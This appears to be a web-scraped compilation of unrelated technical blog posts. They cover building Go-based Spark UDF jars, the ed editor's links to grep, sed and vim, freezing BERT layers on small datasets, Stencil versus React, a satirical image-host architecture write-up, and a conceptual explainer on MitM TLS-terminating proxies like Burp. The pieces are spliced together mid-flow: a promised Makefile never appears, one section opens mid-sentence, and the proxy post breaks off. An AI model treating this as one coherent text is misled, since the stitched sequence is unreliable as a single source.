<figure><pre><code data-lang="shell"><span></span><span>cd</span> java <span>&amp;&amp;</span> jar uf ../eventdecoder.jar com/community/EventsUDF/*.class</code></pre></figure>

<p>That will update the jar file qnd insert our class. You can load that up into
Spark and call it as shown at the start of this post.</p>

<h2 id="important-notes">Important Notes</h2>

<p>You need to build this for the architecture where you will run your Spark job!
Spark may be in Scala, and we may have wrapped this stuff up into a Java jar,
but the code inside is still native binary. You may have some success with
<code>GOOS</code> and <code>GOARCH</code> settings, but it has not been repeatable for us with
<code>gojava</code>. We’ve built our UDFs that we use on Databricks’ platform under Ubuntu
18.04 with Go 1.14 and they work great.</p>

<p>Another gotcha that <a href="https://github.com/andrijaa">Aki Colović</a> found when
working with this stuff, is that your Go package <em>cannot contain an underscore</em>
or it makes the Java class loader unhappy. So don’t do that.</p>

<h2 id="a-makefile-to-make-it-simpler">A Makefile to Make it Simpler</h2>

<p>There were a few finicky steps above and this needs to be repeatable. So, I
built a <code>Makefile</code> to facilitate these UDF builds. It does all the important
steps in one go. As you will see below, we have cached the right versions of
the Spark jars in S3, but you can pull them from wherever you like. If you are
into Java build tools, feel free to use those.</p>

<p>The <code>Makefile</code> I wrote looks like this. You will likely have to make little
changes to make it work for you.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Vim, sed and grep are three very popular command-line tools for Linux platforms. &nbsp;This article will attempt to explain the origins of these tools by showing how they use a number of syntax features that are <em><strong>identical</strong></em> to an equivalent command that uses <a href="https://blog.robertelder.org/paper-display-terminal-ed-vim/">the ancient 'ed' editor</a> which was written in the late 1960s.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;For the purposes of demonstration, some example text (included at the end of this article) is contained in a file named 'lorem' which will be referenced by the commands found later in this article.</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Let's say that we want to find all lines in the file 'lorem' that contain the sequence of letters 'que'. &nbsp;You can do that with grep using this command:</p>

<p><code><pre>grep "que" lorem
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;But, you could also do this by opening up the file 'lorem' with the 'ed' editor:</p>

<p><code><pre>ed lorem
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This will bring you to the command prompt of 'ed' where it will wait until you type a command that's specific to the 'ed' editor. &nbsp;Typing the following 'ed' command:</p>

<p><code><pre>g/que/p
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;will cause 'ed' to find all lines that contain 'que' and print them out, followed by returning to the 'ed' command prompt.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;We're now done working with 'ed' at this point, so we can type the 'q' command to exit, or just press Ctrl+d.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Since we only wanted to use 'ed' for its ability to search for lines with matching text, we can make this process a bit faster by just echoing an 'ed' command and piping it directly into 'ed' like this:</p>

<p><code><pre>echo "g/que/p" | ed lorem
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The above command will open up 'ed' on the file 'lorem', search through the files and print the matching lines, and then exit back to the shell prompt for us. &nbsp;We now have a way to produce output that is effectively as what we get from grep, but with 'ed'. &nbsp;The only minor difference is the character count that 'ed' prints out to stderr, which could be separately piped to /dev/null to ignore it:</p>

<p><code><pre>echo "g/que/p" | ed lorem 2&gt;/dev/null
</pre></code></p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Since the last example was just a simple string search, you might assume the similarity is just a coincidence. &nbsp;However, this also works with most BRE-like regular expressions (the default regular expression type with grep). &nbsp;Here is a grep command that will search for all lines that contain a sequence of two 's' characters:</p>

<p><code><pre>grep "s\{2\}" lorem
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;And here is the same search, but using the 'ed' command instead:</p>

<p><code><pre>echo 'g/s\{2\}/p' | ed lorem
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Since this pattern generalizes to most BRE-like regular expressions, you could use 're' to stand for 'Regular Expression' and the generic way of describing this use of ed would look like this:</p>

<p><code><pre>echo 'g/re/p' | ed lorem
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Notice, the '<strong>g/re/p</strong>' part or '<strong>grep</strong>'. &nbsp;Yup, that's where the name comes from. &nbsp;This is described in detail by <a href="https://www.youtube.com/watch?v=NTfOnGZUZDk">Brian Kernighan in this YouTube video</a>. &nbsp;'grep' = the 'ed' command for 'Global Regular Expression Print'.</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'grep' is not the only common Linux tool that has been influenced by 'ed'. &nbsp;'sed' is another example of a command-line tool where some of its syntax features can be <em>verbatim</em> copied into 'ed' to perform the same action. &nbsp;For example, here is a sed command that will find all lines in the file 'lorem' that contain a sequence of two 's' characters and replace them with two 't' characters. &nbsp;The result is then piped into the file '2' for later comparison:</p>

<p><code><pre>sed '1,$s/s\{2\}/tt/g' lorem &gt; 2
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;And using a similar pattern as before, here is an echo statement that will use the exact same argument that we passed to 'sed', but as an 'ed' command:</p>

<p><code><pre>echo -e '1,$s/s\{2\}/tt/g'"\n"'1,$p' | ed lorem &gt; 1
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;One difference in the command above is that we need to also echo a newline followed by another 'ed' command to actually print out the current contents of the file from inside the 'ed' editor. &nbsp;In the case of 'sed', the string replacement will run on every line and then immediately output the result. &nbsp;With the 'ed' command version, we're basically just saying "Open the file 'lorem' with 'ed', run the replacement rule on all lines in the file to replace 'ss' with 'tt', then print out every line of the file, then exit".</p>

<p><img src="https://blog.robertelder.org/images/vim-sed-grep-ed-commands_grep-ed-compare_1646x854_q92.png" width="1646" height="854"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Now that we've edited the file 'lorem' using two different methods, let's diff the two resulting files '1' and '2' to see if there are any differences:</p>

<p><code><pre>vim -d 1 2
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;In my case, the above command shows no differences. &nbsp;It's not always the case that <em>every</em> 'sed' command will work exactly the same as an 'ed' command like this, but by now you should hopefully see the similarities.</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Comparing 'vim' with 'ed' is where things should really start to make sense. &nbsp;If you've used vim before, you've most likely typed 'Esc' followed by ':' more than a few times. &nbsp;What you probably didn't know is that those ':' commands are actually called 'Ex' commands. &nbsp;The cool thing is, you can actually run any 'Ex' command automatically as soon as you open up vim from the command-line by using the '-c' flag. &nbsp;For example, if you want to open up the file 'a' in vim and immediately delete lines 10-20, you can use this command:</p>

<p><code><pre>vim a -c '10,20d'
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;similarly, you can use this command to open up vim and them immediately copy or 'transfer' lines 4 to 7 to after line 15 using this command:</p>

<p><code><pre>vim a -c '4,7t15'
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;You can also do the same thing with string replacement Ex commands. &nbsp;This will open up vim and immediately do a string replacement to replace 'Nunc' with 'ABC' on line 28:</p>

<p><code><pre>vim a -c '28s/Nunc/ABC/'
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Don't forget that saving and quitting vim is an Ex command too! &nbsp;Therefore, you can do this to open up vim and exit it immediately:</p>

<p><code><pre>vim a -c 'wq'
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Putting these all together gives us this vim command which opens vim, makes all 3 of the changes, then saves and quits. &nbsp;For the sake of example, the files 'a' and 'b' have the contents of the same 'lorem' file noted previously:</p>

<p><code><pre>vim a -c '10,20d' -c '4,7t15' -c '28s/Nunc/ABC/' -c 'wq'
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Now, here's the punch line: &nbsp;The exact same operations can be done with the 'ed' editor using this command:</p>

<p><code><pre>echo -e '10,20d'"\n"'4,7t15'"\n"'28s/Nunc/ABC/'"\n"'wq' | ed b
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The newlines in the command above are just to separate the individual 'ed' commands. &nbsp;If you were to do this without a pipe, you'd just open the file with 'ed' normally:</p>
<p><code><pre>ed b
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and then enter the following ed commands one after another:</p>

<p><code><pre>10,20d
4,7t15
28s/Nunc/ABC/
wq
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Now, you can use vim to compare the two files 'a' and 'b' to see if they're the same:</p>

<p><code><pre>vim -d a b
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;In my case, they're identical.</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;There is more to say about 'ex' commands. &nbsp;In fact, if you check the man pages for vim, you'll find that there is a '-e' flag that says it will 'Start Vim in Ex mode, just like the executable was called "ex"'. &nbsp;That's interesting, let's try launching vim with the -e flag:</p>

<p><code><pre>vim -e lorem
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The result is something that looks like this:</p>

<p><img src="https://blog.robertelder.org/images/vim-sed-grep-ed-commands_vim-e_1163x211_q92.png" width="1163" height="211"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;So clearly we're in vim, but we just have a command prompt that looks like the 'ed' editor. &nbsp;Let's try using an 'ed' command to print out all lines in the file and see what happens:</p>

<p><code><pre>1,$p
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Neat! &nbsp;It worked! &nbsp;So, the 'Ex' mode of vim is basically just an 'command-line interface' like editor that accepts 'Ex' commands, but really it's vim under the hood. &nbsp;It also happens to be the case that a lot (but not all) of the Ex commands are identical to 'ed' commands.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;When launching vim in 'Ex' mode, you can get back to regular visual mode by typing:</p>

<p><code><pre>visual
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;as an Ex command. &nbsp;To go the other way, from visual to 'Ex' mode, you can press Shift Q (not as an Ex command, just press it in visual mode):</p>

<p><code><pre>Q
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reflecting back on the 'ex' command that was mentioned earlier in the man page, you can try just running a program called 'ex' and see what happens. &nbsp;You'll get the same result as with vim -e. &nbsp;In fact, it's worth checking if 'ex' is a symlink to something...</p>

<p><img src="https://blog.robertelder.org/images/vim-sed-grep-ed-commands_which-ex_1580x308_q92.png" width="1580" height="308"></p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;So, to re-visit the question in the title of this article: "Can you use the 'ed' editor as a drop-in replacement for vim, grep &amp; sed?" &nbsp;It wouldn't really be fair to answer 'Yes' to this question: &nbsp;The commands here were chosen because they are good examples of syntax that is identical between the two context, however it isn't that hard to find a few counter-examples where it doesn't quite work. &nbsp;For example, things like cutting and pasting are different between 'ed' and vim, and some of the range syntax that sed accepts is not accepted by 'ed', however the overall similarities are still there. &nbsp;Having said this, the answer to this question isn't quite 'No' either: &nbsp;Depending on what you want to accomplish with vim/grep/sed, you may actually be able to get away with using an identical (or very similar) command in the 'ed' editor as demonstrated in this article.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;In the end, the purpose of this article is not to convince you that all of the features in vim/grep/sed are exactly replicated in 'ed', but rather to show how these common Unix tools have a lot more in common than most people realize.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <p><span>S</span>ince the advent of the Transformer architecture (Vaswani et al. 2017) and of BERT models (Devlin et al. 2019), Transformer models have become ubiquitous in NLP, achieving SOTA results on most NLP datasets.</p>
<p>Before Sesame Street puppets flooded on ArXiv, the de-facto method to train an NLP model leveraged word embeddings pre-trained using Glove or word2vec. These word embeddings were used to initialize the first embedding layer of your model, and you just had to plug the rest of your architecture above this first layer.</p>
<p>Nowadays, it’s increasingly common to use BERT-like language models trained on vast amounts of unlabeled text, and fine-tune the model on task-specific data. This change of paradigm led to a new subfield in NLP called BERTology which studies the ins and outs of BERT-like models.</p>
<p>Many hyper-parameters of BERT — such as the number of attention heads or the learning rate to use — have been studied, but few papers looked at how layer freezing affects performances.  Freezing layers means disabling gradient computation and backpropagation for the weights of these layers. This is a common technique in NLP or Computer Vision when working on small datasets as it usually reduces the chances of your model to overfit. Usually, models are frozen from bottom to top, as the first layers of neural networks are thought to encode universal features while the top layers are more task-specific. Another advantage of freezing is that it provides a nice speed boost and reduced memory usage during training.</p>
<p>Most machine learning teams in industry don’t have access to high-quality and domain-specific datasets. As the costs of building custom datasets are high, these datasets are usually way smaller than those often used in academia. Learning how to train better models with fewer data is a major concern, especially in industry. While the effect of freezing on performance has been explored (Lee, Tang, and Lin 2019), the low-resource setting hasn’t attracted much attention yet. Luckily, it’s what this post is all about 😎</p>

<p>To test how freezing affects performances when data is scarce, we will use the now popular <a href="https://github.com/huggingface/transformers" target="_blank" rel="noopener">🤗 Transformers library</a> from Hugging Face to train a RoBERTa model (base version) on two standard binary classification datasets from the GLUE benchmark: SST-2 (Stanford Sentiment Treebank) and CoLA (Corpus of Linguistic Acceptability).</p>
<p>SST-2 is a sentiment analysis task and CoLA a dataset containing sentences labeled with respect to their grammatical acceptability (i.e whether each sentence is grammatically correct or not). SST-2 and CoLA contain ~51% and ~69% of positive samples respectively in their validation set, which gives us a majority class baseline to compare to. We will use accuracy as the metric of evaluation for both datasets.</p>
<p>We will train models with a subset of the training dataset and evaluate on the whole validation dataset. For CoLA and SST-2, we generate subsets of size 50, 100, 200, 500, and 1000, by:</p>
<ul>
<li>taking care that the fraction of positive samples is the same as in the original train dataset (stratify splitting)</li>
<li>generating the splits by increasing size (50, 100, 200, 500, 1000) and reusing all samples from the previous split. By doing so, we limit the variability coming from using different samples in each split.</li>
</ul>
<p>To assess the impact of layer freezing on performances, 0, 2, 4, 8, 10, or 12 encoder layers were frozen. I also tested to only freeze the embedding layers (frozen layers = -1).</p>
<p>Similar to the original RoBERTa paper (Liu et al. 2019), I fine-tuned for 10 epochs with a linear warmup of 1 epoch followed by a linear decay to zero. As my computational budget was limited, I didn’t perform any hyper-parameter search and stuck to the default values (<code>lr = 5e-5</code>, AdamW optimizer).</p>
<p>On both datasets, for each layer freezing value (-1, 0, 2, 4, 8, 10, 12) and for each train size (50, 100, 200, 500, 1000), 5 replicates were trained with a different random seed.</p>
<p>I decided to use the recent (and pretty awesome!) <a href="https://github.com/huggingface/datasets" target="_blank" rel="noopener">🤗Datasets</a> library — also developed by folks from Hugging Face — to easily fetch and process these two datasets:</p>

<p>Here comes the most interesting part!</p>
<p>Below is displayed for both datasets the best accuracy obtained during training on the development set for all train sizes and all numbers of frozen layers. Each red dot on the plot represents a single run.</p>
<p>The complete results can also be found as tables at the end of the post.</p>
<p><img src="https://raphaelb.org/img/freezing-bert/sst2.png" alt="Results on SST-2"></p>
<p><em>SST-2: Best accuracy during training on development set</em></p>
<p><img src="https://raphaelb.org/img/freezing-bert/cola.png" alt="Results on CoLA"></p>
<p><em>CoLA: Best accuracy during training on development set</em></p>
<p>As expected, having more data always help: we gain +0.15 (0.75 → 0.90) in accuracy by increasing dataset size from 50 to 1000 for SST-2.</p>
<p>Freezing all (12) layers of the encoder is definitely not a good idea when dealing with limited data: there is always a significant performance drop, and the resulting models are barely better than a majority class classifier. Freezing 10 layers is also associated with degraded accuracy, even if the effect isn’t as strong. Aside from 10- and 12-frozen layers, there are no clear impact of layer freezing on performances.</p>
<p>We also observe high variability in accuracy between runs with the same settings (but with different random seeds). This instability is known since the release of BERT. While catastrophic forgetting and the small sizes of datasets were first suspected as the causes of this instability, more recent work (Mosbach et al. 2020) suggests that optimization difficulties leading to vanishing gradients are the actual reasons. For both SST-2 and CoLA datasets, there are no clear evidence that freezing reduces these instabilities.</p>
<p>As a final note, the performance gap between SST-2 and CoLA with 50 examples is interesting: while best models for SST-2 classify 82% of samples correctly (with 51% of positive samples), best run are barely better than the majority class baseline with 70% of samples correctly classified. This is indicative of the inductive bias of these models, which are more prone to detect polarity than grammatical correctness.</p>

<p>And that’s all for this second post 😊!</p>
<p>The results of these experiments were surprising to me, I initially thought layer freezing would have a more visible impact on performances.</p>

It lists ~30 libraries for creating web components, comparing code style, performance and bundle size. One of the libraries got me intrigued - Stencil - which looks very promising and has lots of stars on GitHub - about 8.6k.</span></span></p><p id="viewer-m0td"><span><a href="https://stenciljs.com/" target="_blank" rel="noopener"><span><u>Stencil</u></span></a><span> is a React-inspired web component library. It is using the same JSX as React and some of the same concepts (Render function, props, state). However, Stencil differs as it compiles to an optimal bundle, creating Virtual DOM that is consolidated directly into the DOM itself (no VDOM to VDOM comparison). The result is standard web components with optimal performance.</span></span></p><p id="viewer-876ce"><span><span>On top, Stencil provides good development experience through their template applications - for building a component, a website / app or a PWA. Stencil also supports server-side rendering and hydrations for websites that need to be optimized for indexing.</span></span></p><p id="viewer-4f7v9"><span><span>To learn Stencil, we decided to build yet another version of </span><a href="http://todomvc.com/" target="_blank" rel="noopener"><span><u>TodoMVC</u></span></a><span>. TodoMVC is a great platform to compare different javascript libraries - it </span>exposes<span> 54 Javascript UI libraries on one simple use case - a Todo list application. Each application has to look exactly the same, with the same functionality - adding a todo item, marking an item as complete, removing completed items, etc. Every instance of the application needs to be persistent with local storage and feature routing for display all, active or completed todos, and so on. </span></span></p><p id="viewer-5ab1d"><span><span>Here is an example of a TodoMVC application:</span></span></p><div id="viewer-9kpfo"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.wix.engineering/post/is-stencil-a-better-react" data-pin-media="https://static.wixstatic.com/media/66bc35_451dfe597f8c4a3e99ebd9013facd90f~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/66bc35_451dfe597f8c4a3e99ebd9013facd90f~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-5isi0"><span><span>In this article we share what we’ve learned from building a TodoMVC application using Stencil.</span></span></p><p id="viewer-7pffh"><span><span>Our finished copy of the complete Stencil TodoMVC application is on GithuB: </span></span></p><ul><li id="viewer-2ajfe"><p><span>Github pages - </span><a href="https://yoavaa.github.io/stencil-todo-mvc/" target="_blank" rel="noopener"><span><u>demo</u></span></a> </p></li><li id="viewer-504l8"><p><span>Github </span><a href="https://github.com/yoavaa/stencil-todo-mvc" target="_blank" rel="noopener"><span><u>repo</u></span></a> </p></li><li id="viewer-6isa4"><p><span>Pull request for TodoMVC is </span><a href="https://github.com/tastejs/todomvc/pull/2130" target="_blank" rel="noopener"><span><u>here</u></span></a><span>.</span></p></li></ul><p id="viewer-df9em"><span><span>Here’s an equivalent React TodoMVC application for reference:</span></span></p><ul><li id="viewer-e9k4l"><p><a href="http://todomvc.com/examples/react/#/" target="_blank" rel="noopener"><span><u>TodoMVC React Example</u></span></a></p></li></ul><p id="viewer-ce1qk"><span><span>Just for the fun of it, we also added a </span><a href="https://svelte.dev/" target="_blank" rel="noopener"><span><u>Svelte</u></span></a><span> TodoMVC application for the performance comparison</span></span></p><ul><li id="viewer-acl7k"><p><a href="http://svelte-todomvc.surge.sh/" target="_blank" rel="noopener"><span><u>Svelte TodoMVC Example</u></span></a></p></li></ul><p id="viewer-8a90"><span><span>A side note on Svelte - that’s another framework we’ve considered in the past and one we’re following closely today.

With Stencil both the props and state are just members of </span><span>this</span><span> - </span><span>this.newTodo</span><span> and</span><span> this.mode</span><span>l.</span></span></p><p id="viewer-6ojpl"><span><span>The second difference is the use of the </span><span>class</span><span> attribute instead of the </span><span>className</span><span> attribute. The semantics are the same, with Stencil using the more standard naming scheme.</span></span></p><p id="viewer-acdmj"><span><span>The third difference is event binding, where in Stencil they promote using arrow functions while React promotes explicit binding using the</span><span> .bind() </span><span>function. This is obviously a preference and both options can be used in both libraries.</span></span></p><p id="viewer-8hram"><span><span>The last, not so obvious, difference is with using child components. In the React version, we see the use of </span><span>TodoFooter</span><span> and </span><span>TodoItem</span><span> - both are React components which are imported into the module. However, with Stencil, the child components are</span><span> todo-footer</span><span> and</span><span> todo-item</span><span>, and there is no import statement to import those into the module. </span></span></p><p id="viewer-d0h3a"><span><span>While this may seem strange at first glance, it actually makes sense once you remember that both </span><span>todo-footer</span><span> and</span><span> todo-item</span><span> are web components and are supported natively by browsers.</span></span></p><p id="viewer-f06tp"><span><span>When comparing Stencil to React and Svelte in terms of performance, Stencil scores a higher lighthouse score for desktop. For mobile, Svelte takes the lead but is less stable. Stencil on mobile is close behind Svelte and is more stable.</span></span></p><p id="viewer-9o36j"><span><span><strong>Desktop comparison:</strong></span></span></p><div id="viewer-83opl"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.wix.engineering/post/is-stencil-a-better-react" data-pin-media="https://static.wixstatic.com/media/66bc35_d9cba83a658e4417a9cc3b645d5b8618~mv2.png/v1/fit/w_1000%2Ch_320%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/66bc35_d9cba83a658e4417a9cc3b645d5b8618~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-6ong4"><span><span><strong>Mobile Comparison (3 runs):</strong></span></span></p><div id="viewer-b92bd"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.wix.engineering/post/is-stencil-a-better-react" data-pin-media="https://static.wixstatic.com/media/66bc35_b34e4ab9ba6b4111b98a2e7b44ffcd1d~mv2.png/v1/fit/w_1000%2Ch_488%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/66bc35_b34e4ab9ba6b4111b98a2e7b44ffcd1d~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-9gf8n"><span><span>All the libraries score very high grades for the TodoMVC case.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
Posted on
<time itemprop="datePublished" datetime="2020-11-19">November 19, 2020</time>.
</p><div itemprop="articleBody"><p>Every day at work, hundreds of customers ask us "can I get a large cappuccino?". Later, we go home and use the money to narrowly avoid starvation while working on IMGZ, the best image host, in true Silicon Valley spirit. We thought that some of the architectural challenges we faced while building the service would interest others, and decided to write about them to help our readers and change the world.</p>
<p>If you aren't familiar with IMGZ, it's an image host with a twist: You pay to host images, thus ensuring that we always have your best interests in mind and won't turn into a social network. In essence, we flip the traditional "startup giving away VC money to users" on its head, and take money <strong>from</strong> users. If that sounds good to you, you can sign up <a href="https://imgz.org/">on our home page</a> and we'll only be mildly surprised.</p>
<p>At IMGZ, we're passionate about two things: Serving images, and speaking about ourself in the plural so it doesn't look like it's the one-man sideproject it is, and we don't even really care about serving images that much. Today, though, we're going to talk about the former, and take a deep dive into the technical details of serving more than one million bytes of images per day while maintaining the elusive "nine fives" reliability guarantee we're loved for and usually uphold.</p>
<h2>Architecture deep-dive</h2>
<p>Our architecture is pretty simple, a fairly run-of-the-mill, scrappy-startup SaaS architecture which you've no doubt seen countless times before:</p>
<p><a href="https://imgz.org/i9hxfgRu/"><img src="https://imgz.org/i9hxfgRu.png" alt="Architecture diagram"></a></p>
<p>While designing the IMGZ storage and serving model, we wanted scalability and reliability to be our foremost concerns.
After months of designs and grueling research, we ended up designing a Kafka-based georeplicated image processing pipeline over a multitenant, distributed, resilient microservices architecture, where metadata about each image is kept in a georeplicated MongoDB instance, and with images themselves stored in DynamoDB on AWS, ensuring scalability and low latency.</p>
<p>When we realized we didn't have investors to impress, we trashed that plan, as it sounded like too much work.
We realize that architecture design nowadays is mostly aspirational, but at some point a startup needs to come to terms with the fact that it doesn't have ten million users right now, it probably won't have ten million users soon, and it'll likely never have ten users.
Instead, we stored the images in a small Postgres database (yes, the actual image data itself), with a small Django app handling the business logic. Sexy.</p>
<p>When the user uploads an image, we process it, create thumbnails for displaying in various views of the website, and store it along with its metadata in the database, at least in theory.
When a user requests the image, the request first goes through our CDN, which fetches the image from our server and then caches it forever, so each image is only served by us at most once.
For our CDN (for serving, caching, georeplication, etc), we use CloudFlare's free tier, which is excellent.
We ensure that we'll always remain in the free tier by providing a paid service nobody would actually ever pay for.</p>
<h2>The hardware</h2>
<p>This is the heart of IMGZ:</p>
<p><a href="https://imgz.org/iABb4tze/"><img src="https://imgz.org/iABb4tze.jpg" alt="Servers"></a></p>
<p>Images, just like the one above, are the heart of our service, but let's not digress.
The hardware is a $5/mo Hetzner VM that serves ~10 other projects, so it's pretty beefy.
As our favorite proverb goes, "you don't need lots of resources when all your content is static and you can get someone else to serve it for free".</p>
<p>We're pretty confident in our ability to scale our infrastructure in the event that more users join the service, as our VPS provider has a button we can press to make the server larger, solving all scalability problems once and for all.</p>
<h2>Moral of the story</h2>
<p>This article was a bit boring, wasn't it? That's by design: Your architecture doesn't have to be exciting to work, especially in the early stages of a company. Doing the easiest thing that works (taking care not to paint yoursellf into a corner) is often the best way to start, since you usually don't even know where you'll end up.</p>
<p>To summarize, our architecture follows the tried-and-true Silicon Valley approach: Build the simplest thing you can, by piggybacking off of everyone's free tier, while they hope you one day become successful and pay them exorbitant amounts of money in return. The strategy to outsmarting them is simple:</p>
<p>Just make sure you never succeed.</p>

Conclusion and Future Plans</a></li></ul></nav><p>In order to create our own custom proxies, first we need to know how proxies work. When I wanted to write a custom proxy tool (it's a simple Python script) in <a href="https://parsiya.net/blog/2015-10-19-proxying-hipchat-part-3-ssl-added-and-removed-here/" title="Proxying Hipchat Part 3: SSL Added and Removed Here" target="_blank">Hipchat part3</a>, I had to go back and learn how they work. I did not find such a resource online that looked at proxies from an infosec perspective. Most talked about how to configure caching or forwarding proxies and not much about MitM ones. I have briefly talked about it in the section 2 of the same post named <code>How does a Proxy Work?</code>. In this post I am going to take a deep(er) dive. I actually read some RFCs and they were surprisingly well written.</p><p>If you want to skip the intro, go to <a href="#section-3" title="How HTTP Proxies Work" target="_blank">section 3</a>.</p><p>That is a fair question. Most of the time, we pipe the browser to Burp and it works out of the box. However, if something small changes we will go into panic mode. What if the webapp uses a Java or Silverlight component and it has some quirky things? Another reason is for proxying thick clients because Burp as you have seen here is not just for webapps. My opinion is "<strong>if the application uses HTTP, you can Burp it</strong>." Thick clients may not work out of the box when proxied (often just redirecting their traffic to the proxy is a pain). If we do not know how proxies work internally, we cannot troubleshoot the issues.</p><p>You are now convinced that you need to read this right? <strong>riiiiiiiiiiiiight?</strong></p><p>It really helps to put ourselves in place of the proxy when reading this. At least that is what worked for me. Proxy does not know whatever happens in the system like an observer. As an observer we can just make decisions about what the proxy <em>should</em> do. Things like "the user typed google.com in their browser so the proxy must send the request to google.com." Well, how does the proxy know that? The proxy cannot magically see the browser's address bar.</p><h2 id="1-1-what-does-it-mean">1.1. What does it Mean?</h2><p>We are the proxy. The only things we see are the requests/packets that the client (e.g. browser) and the endpoint send to us. We do not know anything else. And as a proxy we must decide what to do with the requests that we receive with only our knowledge.</p><p>Now that we are hopefully in the zone, let's start.</p><p>I am going to talk about two types of proxies here.</p><ul><li>Forwarding proxies</li><li>TLS terminating proxies</li></ul><p>The descriptions are not entirely accurate or detailed but are enough for our purpose. Of course this is not an exhaustive list. There are other proxies out there but these are the ones that we are interested in. To be honest we are only interested in TLS terminating proxies.</p><h2 id="2-1-forwarding-proxies">2.1. Forwarding Proxies</h2><p>We have all seen them before. These are corporate proxies that we see and use everyday. If you are in a corporate environment, check the proxy auto-config (pac) scripts. Essentially it's a text file that tells the application where to send the traffic and re-routes the traffic based on the endpoint. Usually if the endpoint is internal, things get routed normally through the internal network otherwise (requests sent over the internet) requests are sent to a forwarding proxy. You can see some examples at <a href="https://technet.microsoft.com/en-us/library/cc985335.aspx" target="_blank">Microsoft Technet</a>. From the point of view of the application, the forwarding proxy is sitting between the internal network and the internet.</p><p>Based on the name, these proxies just forward packets and cannot look inside encrypted payloads (e.g. TLS). From the point of view of a typical forwarding proxy, an established TLS connection is just a bunch of packets with random looking TCP payloads.</p><h2 id="2-2-tls-terminating-proxies">2.2. TLS Terminating Proxies</h2><p>Burp is the prime example of this type. If you know what Burp does (and you probably do because you are reading this), you know what a TLS terminating proxy does. These are proxies that usually MitM the connections and unwrap TLS to look inside the payloads.</p><p>They could be applications like Burp or Fiddler which are usually used for (security) testing. Or could be appliances like Bluecoat or the <a href="https://live.paloaltonetworks.com/t5/Configuration-Articles/How-to-Implement-and-Test-SSL-Decryption/ta-p/59719" target="_blank">SSL decryption module</a> of Palo Alto Networks' "thing" (whatever it is named). Usually these appliances are used for deep packet inspection.</p><p>You could make Burp work like a forwarding proxy by adding all endpoints to Burp's <a href="https://parsiya.net/blog/2016-03-27-thick-client-proxying-part-1-burp-interception-and-proxy-listeners/#1-4-ssl-pass-through" title="SSL Pass Through" target="_blank">SSL Pass Through</a>. This is useful for troubleshooting connections.</p><h3 id="2-2-1-it-s-not-always-tls">2.2.1. It's not Always TLS</h3><p>True. Sometimes our proxy decrypts (or decodes) layers of non-TLS encryption (or encoding). I am classifying all of these proxies under this category because TLS has become the most common way of protecting data in transit.</p><p>Now we get to the main part. In all examples we have a browser that uses a proxy (via some proxy settings) and the browser knows that it is connected to a proxy (I will talk about this later).</p><h2 id="3-1-http-proxy">3.1. HTTP Proxy</h2><p>In this case the browser is using plain HTTP (meaning there's no TLS). Both forwarding and TLS terminating proxies work similarly in this case.</p><p>Let's assume we have typed <a href="http://www.yahoo.com/" target="_blank">http://www.yahoo.com</a> in the browser. Let's forget that we get a 302 redirect in the real world and assume yahoo.com is available over HTTP. I probably should have used example.com instead but I am lazy and don't 